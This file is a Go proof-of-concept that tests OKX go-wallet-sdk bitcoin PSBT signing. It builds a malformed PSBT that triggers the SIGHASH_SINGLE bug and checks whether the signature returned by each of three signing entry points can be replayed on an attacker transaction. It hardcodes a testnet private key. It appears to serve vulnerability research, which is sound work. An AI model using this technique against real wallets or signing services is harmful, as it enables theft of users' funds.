package main

import (
	"bytes"
	"encoding/hex"
	"fmt"

	"github.com/btcsuite/btcd/btcec/v2"
	"github.com/btcsuite/btcd/btcec/v2/ecdsa"
	"github.com/btcsuite/btcd/btcutil"
	"github.com/btcsuite/btcd/btcutil/psbt"
	"github.com/btcsuite/btcd/chaincfg"
	"github.com/btcsuite/btcd/chaincfg/chainhash"
	"github.com/btcsuite/btcd/txscript"
	"github.com/btcsuite/btcd/wire"
	"github.com/okx/go-wallet-sdk/coins/bitcoin"
)

const wif = "cPnvkvUYyHcSSS26iD1dkrJdV7k1RoUqJLhn3CYxpo398PdLVE22"

func buildHostilePSBT(pub *btcec.PublicKey) (string, []byte, error) {
	h := btcutil.Hash160(pub.SerializeCompressed())
	spk, _ := bitcoin.PayToPubKeyHashScript(h)
	fund := wire.NewMsgTx(2)
	fund.AddTxIn(wire.NewTxIn(&wire.OutPoint{Hash: chainhash.Hash{0x51}, Index: 0}, nil, nil))
	fund.AddTxOut(wire.NewTxOut(100000, spk))
	tx := wire.NewMsgTx(2)
	tx.AddTxIn(wire.NewTxIn(&wire.OutPoint{Hash: chainhash.Hash{0x52}, Index: 0}, nil, nil))
	tx.AddTxIn(wire.NewTxIn(&wire.OutPoint{Hash: fund.TxHash(), Index: 0}, nil, nil))
	tx.AddTxOut(wire.NewTxOut(90000, spk))
	pkt, err := psbt.NewFromUnsignedTx(tx)
	if err != nil { return "", nil, err }
	pkt.Inputs[0].NonWitnessUtxo = fund
	pkt.Inputs[1].NonWitnessUtxo = fund
	pkt.Inputs[1].SighashType = 0x83
	var b bytes.Buffer
	_ = pkt.Serialize(&b)
	return hex.EncodeToString(b.Bytes()), spk, nil
}

func sigFrom(pkt *psbt.Packet) []byte {
	for _, ps := range pkt.Inputs[1].PartialSigs { return ps.Signature }
	ss := pkt.Inputs[1].FinalScriptSig
	if len(ss) > 1 {
		n := int(ss[0])
		if 1+n <= len(ss) { return ss[1 : 1+n] }
	}
	return nil
}

func judge(label string, sig []byte, spk []byte, pub *btcec.PublicKey) {
	if sig == nil { fmt.Printf("CELL %s no_signature_found\n", label); return }
	ht := txscript.SigHashType(sig[len(sig)-1])
	tx := wire.NewMsgTx(2)
	atk := wire.NewMsgTx(2)
	atk.AddTxIn(wire.NewTxIn(&wire.OutPoint{Hash: chainhash.Hash{0x61}, Index: 0}, nil, nil))
	atk.AddTxIn(wire.NewTxIn(&wire.OutPoint{Hash: chainhash.Hash{0x62}, Index: 0}, nil, nil))
	attackerScript, _ := bitcoin.PayToPubKeyHashScript(bytes.Repeat([]byte{0x33}, 20))
	atk.AddTxOut(wire.NewTxOut(99900, attackerScript))
	dig, err := txscript.CalcSignatureHash(spk, ht, atk, 1)
	ok := false
	if err == nil {
		if sg, e := ecdsa.ParseDERSignature(sig[:len(sig)-1]); e == nil { ok = sg.Verify(dig, pub) }
	}
	constant := len(dig) == 32 && dig[0] == 1
	for i := 1; i < 32 && constant; i++ { constant = dig[i] == 0 }
	fmt.Printf("CELL %s declared_psbt_sighash=0x%02x digest_is_constant_01=%v attacker_tx_script_0x33_sig_valid=%v\n", label, ht, constant, ok)
	_ = tx
}

func main() {
	w, _ := btcutil.DecodeWIF(wif)
	pub := w.PrivKey.PubKey()
	psbtHex, spk, _ := buildHostilePSBT(pub)

	sA, errA := bitcoin.SignPsbtWithKeyPathAndScriptPath(psbtHex, wif, &chaincfg.TestNet3Params, &bitcoin.SignPsbtOption{AutoFinalized: false})
	fmt.Printf("CELL A-returned_err_nil=%v\n", errA == nil)
	if errA == nil {
		raw, _ := hex.DecodeString(sA); pA, _ := psbt.NewFromRawBytes(bytes.NewReader(raw), false)
		judge("A-declared-empty-options", sigFrom(pA), spk, pub)
	}

	var nilOpt *bitcoin.SignPsbtOption
	sB, errB := bitcoin.SignPsbtWithKeyPathAndScriptPath(psbtHex, wif, &chaincfg.TestNet3Params, nilOpt)
	fmt.Printf("CELL B-returned_err_nil=%v\n", errB == nil)
	if errB == nil {
		raw, _ := hex.DecodeString(sB); pB, _ := psbt.NewFromRawBytes(bytes.NewReader(raw), false)
		judge("B-declared-nil-option", sigFrom(pB), spk, pub)
	}

	sC, errC := bitcoin.SignRawPSBTTransaction(psbtHex, wif)
	fmt.Printf("CELL C-returned_err_nil=%v\n", errC == nil)
	if errC == nil {
		raw, _ := hex.DecodeString(sC); pC, _ := psbt.NewFromRawBytes(bytes.NewReader(raw), false)
		judge("C-raw-psbt-entry", sigFrom(pC), spk, pub)
	}
}
